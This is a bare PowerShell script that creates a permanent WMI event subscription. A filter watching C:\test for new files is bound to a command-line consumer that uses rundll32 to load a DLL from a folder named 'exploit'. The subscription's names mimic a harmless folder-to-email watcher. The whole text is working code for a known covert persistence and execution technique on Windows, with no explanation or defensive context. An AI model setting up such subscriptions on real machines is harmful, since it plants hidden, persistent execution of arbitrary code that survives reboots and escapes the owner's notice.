$WQLQuery = 'SELECT * FROM __InstanceCreationEvent WITHIN 60 
             WHERE TargetInstance ISA "CIM_DirectoryContainsFile"
             AND TargetInstance.GroupComponent = "Win32_Directory.Name=\"C:\\\\test\""'

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name="WatchFolder2EmailFilter";
                 EventNameSpace="root\cimv2";
                 QueryLanguage="WQL";
                 Query=$WQLQuery
                }


$WMIEventConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace "root\subscription" -Arguments @{Name="WatchFolder2EmailConsumer";
                 ExecutablePath = "C:\\Windows\\System32\\rundll32.exe"
                 CommandLineTemplate = "C:\\Windows\\System32\\rundll32.exe c:\\users\\sunny\\exploit\\myfile.dll,main"
                }


Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}
